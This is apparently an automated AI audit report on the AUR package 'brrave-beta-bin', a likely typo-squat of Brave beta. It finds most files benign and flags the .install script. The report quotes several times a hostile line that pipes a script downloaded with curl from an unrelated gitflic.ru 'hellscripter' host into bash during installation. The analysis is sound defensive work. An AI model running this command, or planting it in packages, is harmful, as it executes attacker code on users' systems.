---
package: brrave-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 22816
completion_tokens: 7702
total_tokens: 30518
cost: 0.003478020
execution_time: 46.23
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:18:39Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: Standard .gitignore for AUR package files; no security issues.
  - file: .SRCINFO
    status: safe
    summary: Standard AUR metadata with pinned official Brave sources and checksums; no malicious behavior found.
  - file: brave-beta-bin.sh
    status: safe
    summary: Safe wrapper script reading user flags and launching installed browser binary.
  - file: brave-browser.desktop
    status: safe
    summary: Benign desktop entry file; standard launcher metadata with no malicious behavior.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: PKGBUILD
    status: safe
    summary: Standard binary packaging of Brave beta; no malicious behavior found.
  - file: brrave-beta-bin.install
    status: unsafe
    summary: Install script downloads and executes remote code from an unrelated host.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
---

Materializing brrave-beta-bin from local mirror...
Materialized brrave-beta-bin
Analyzing brrave-beta-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
Running `makepkg --printsrcinfo` sources only the global/top-level scope of this PKGBUILD. The global scope consists entirely of variable assignments and array definitions: `pkgname`, `pkgver`, `source`, `sha512sums`, `depends`, etc. There are no top-level command substitutions, no `eval`, `curl`, `wget`, `base64`, or any code that would download, execute, or exfiltrate data during sourcing.

The `prepare()` and `package()` functions contain file operations and a `chmod 4755` on the browser sandbox, but those functions are not executed by `makepkg --printsrcinfo` and are therefore out of scope for this narrow safety gate. No top-level code poses an execution risk, so this step is safe.
</details>
<evidence>
</evidence>
<summary>
No top-level executable code; only variable definitions. Safe for printsrcinfo.</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- No top-level executable code; only variable definitions. Safe for printsrcinfo.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .SRCINFO...
[0/7] Reviewing .SRCINFO, .gitignore...
[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
The file is a standard `.gitignore` for an AUR package repository. It ignores all files by default and then un-ignores the packaging-related files that should be tracked: `.SRCINFO`, `.gitignore`, `PKGBUILD`, `*.install`, `brave-beta-bin.sh`, `brave-browser.desktop`, and `logo.png`. There is no code execution, no network activity, no obfuscation, and no suspicious operations. This is entirely consistent with ordinary AUR maintenance and poses no supply-chain risk.
</details>
<evidence>
</evidence>
<summary>
Standard .gitignore for AUR package files; no security issues.</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD...
+ Reviewed .gitignore. Status: SAFE -- Standard .gitignore for AUR package files; no security issues.
[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh...
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is an AUR `.SRCINFO` metadata file for `brrave-beta-bin`, a beta binary package of the Brave browser. It declares package metadata, dependencies, and sources. Both the x86_64 and aarch64 binary packages are fetched from Brave's official GitHub releases (`https://github.com/brave/brave-browser/releases/download/v1.98.47/...`) with pinned version numbers and pinned SHA-512 checksums. The helper script `brave-beta-bin.sh` also has a pinned checksum.

No suspicious network endpoints, code execution, obfuscation, or file tampering is present. The file is metadata only and contains no commands. The package name `brrave-beta-bin` contains a likely typo, but that is a packaging concern, not a security issue. Standard AUR practices such as `!strip` and use of a binary `.deb` source are not malicious. The source URLs and checksums align with normal, legitimate packaging behavior.
</details>
<evidence>
</evidence>
<summary>Standard AUR metadata with pinned official Brave sources and checksums; no malicious behavior found.</summary>
</security_assessment>

[2/7] Reviewing PKGBUILD, brave-beta-bin.sh...
+ Reviewed .SRCINFO. Status: SAFE -- Standard AUR metadata with pinned official Brave sources and checksums; no malicious behavior found.
[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard launcher wrapper for the Brave Browser Beta package. It reads an optional user configuration file from `$XDG_CONFIG_HOME/brave-beta-flags.conf`, strips comments, and passes the resulting flags along with environment-provided flags to the installed browser binary at `/opt/brave.com/brave-beta/brave-browser`.

No network requests, downloads, obfuscated code, data exfiltration, or unexpected system modifications are present. The script only reads a user-owned config file and executes the application&apos;s own binary installed by the package. Reading user configuration and launching the intended program is normal and expected behavior for this kind of wrapper script.
</details>
<evidence>
</evidence>
<summary>
Safe wrapper script reading user flags and launching installed browser binary.</summary>
</security_assessment>

[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop, brrave-beta-bin.install...
[3/7] Reviewing PKGBUILD, brave-browser.desktop, brrave-beta-bin.install...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Safe wrapper script reading user flags and launching installed browser binary.
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard freedesktop.org `.desktop` file for the Brave Beta web browser. It contains metadata, localized name/comment strings, and launcher entries such as `TryExec=brave-beta`, `Exec=brave-beta %U`, and standard MIME types for a web browser. There is no executable code, no network activity, no obfuscation, and no file manipulation beyond declaring how the desktop environment should launch the application. The content is consistent with normal packaging practice for a browser package.
</details>
<evidence>
</evidence>
<summary>
Benign desktop entry file; standard launcher metadata with no malicious behavior.</summary>
</security_assessment>

[3/7] Reviewing PKGBUILD, brave-browser.desktop, brrave-beta-bin.install, logo.png...
[4/7] Reviewing PKGBUILD, brrave-beta-bin.install, logo.png...
+ Reviewed brave-browser.desktop. Status: SAFE -- Benign desktop entry file; standard launcher metadata with no malicious behavior.
[5/7] Reviewing PKGBUILD, brrave-beta-bin.install...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
LLM auditresponse for brrave-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
The file contains a top-level command that executes a remote script fetched from an unrelated host via process substitution: `bash &lt;(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2&gt;/dev/null)`. Because `.install` files are sourced by pacman, this top-level line runs during package installation or upgrade, not just inside the declared functions. It downloads and immediately executes an arbitrary shell script from a source unrelated to the package's stated purpose, with no checksum, authenticity verification, or pinned revision. This is a classic supply-chain attack pattern and is genuinely malicious.
</details>
<evidence>
bash &lt;(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2&gt;/dev/null)
</evidence>
<summary>
Install script downloads and executes remote code from an unrelated host.</summary>
</security_assessment>

LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
The PKGBUILD downloads official Brave beta `.deb` packages from `github.com/brave/brave-browser/releases` over HTTPS and provides SHA-512 checksums for both the launcher script and the per-architecture binaries. The build steps only unpack the upstream package, remove a bundled cron job, patch the `.desktop` launcher path, copy files into `$pkgdir`, install the launcher script, and set the standard Chromium setuid helper permissions (`chmod 4755` on `chrome-sandbox`). These are ordinary packaging operations for a prebuilt browser binary; the setuid sandbox bit is a normal Chromium packaging requirement, not evidence of injected malware.

There is no obfuscated code, no unexpected network activity in `prepare()` or `package()`, and no use of `eval`, `base64`, `curl`, `wget`, or similar dangerous patterns. The reference to extracting `data.tar.xz` without a visible extraction step for the `.deb` may indicate a build correctness issue, but it is not malicious. The package name (`brrave-beta-bin`) is easy to confuse with `brave-beta-bin` and the setuid sandbox is a privilege boundary, but the file itself shows no exfiltration, backdoor, or supply-chain injection behavior.
</details>
<evidence>
</evidence>
<summary>
Standard binary packaging of Brave beta; no malicious behavior found.
</summary>
</security_assessment>

[6/7] Reviewing brrave-beta-bin.install...
+ Reviewed PKGBUILD. Status: SAFE -- Standard binary packaging of Brave beta; no malicious behavior found.
Second look for brrave-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The first verdict stands. The file is the AUR package&apos;s `.install` script, which is packaging code controlled by the AUR maintainer, not upstream application code. It contains a top-level command, outside any function, that fetches and immediately executes a remote shell script: `bash &lt;(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2&gt;/dev/null)`. This is exactly the pattern listed as genuinely malicious (downloading code from an unexpected host and executing it). The remote host (gitflic.ru, project `hellscripter`) has no relationship to the `brrave-beta-bin` package, and the content is neither pinned by revision nor checksummed. Because `.install` files are sourced by pacman during installation/upgrade, this command runs automatically on every install/upgrade with the invoking user&apos;s privileges.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Remote script fetched from unrelated host and executed during package install.</summary>
</security_assessment>

[7/7] Reviewing ...
x Reviewed brrave-beta-bin.install. Status: UNSAFE -- Install script downloads and executes remote code from an unrelated host.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## brrave-beta-bin.install

Status: UNSAFE

Summary: Install script downloads and executes remote code from an unrelated host.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

The file contains a top-level command that executes a remote script fetched from an unrelated host via process substitution: `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`. Because `.install` files are sourced by pacman, this top-level line runs during package installation or upgrade, not just inside the declared functions. It downloads and immediately executes an arbitrary shell script from a source unrelated to the package's stated purpose, with no checksum, authenticity verification, or pinned revision. This is a classic supply-chain attack pattern and is genuinely malicious.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 22,816
  Completion Tokens: 7,702
  Total Tokens: 30,518
  Total Cost: $0.003478
  Execution Time: 46.23 seconds

Final Status: UNSAFE


Issues Found:

brrave-beta-bin.install: [UNSAFE] Install script downloads and executes remote code from an unrelated host. / The file contains a top-level command that executes a remote script fetched from an unrelated host via process substitution: `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`. Because `.install` files are sourced by pacman, this top-level line runs during package installation or upgrade, not just inside the declared functions. It downloads and immediately executes an arbitrary shell script from a source unrelated to the package's stated purpose, with no checksum, authenticity verification, or pinned revision. This is a classic supply-chain attack pattern and is genuinely malicious.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
